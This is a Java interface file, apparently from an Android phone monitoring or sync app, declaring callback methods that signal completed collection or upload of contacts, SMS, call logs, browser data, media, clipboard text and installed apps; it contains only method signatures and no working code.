/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.  3:51:35 PM  Jul 11, 2013
 */
package com.hinj.secure.smsgps;

public interface DeviceInterface {
	
	public void onCompletedContacts();
	public void onCompletedSMS();
	public void onCompletedCall();
	public void onCompletedBrowser();
	public void onCompletedDeviceImages();
	public void onCompletedDeviceVideos();
	public void onCompletedDeviceInfo();
	public void onCompletedInstalledApp();
	public void onCompletedMusic();
	public void onCompletedApkUpload();
	
	public void onCompletedClipboardText();
	public void onCompletedContactImageUpload();
	public void onCompletedMusicAlbumImageUpload();
	public void onCompletedApkIconUpload();
	
	public void onCompletedGetCallLogId();
	public void onCompletedGetSMSId();
	public void onCompleteAppDownload();
}
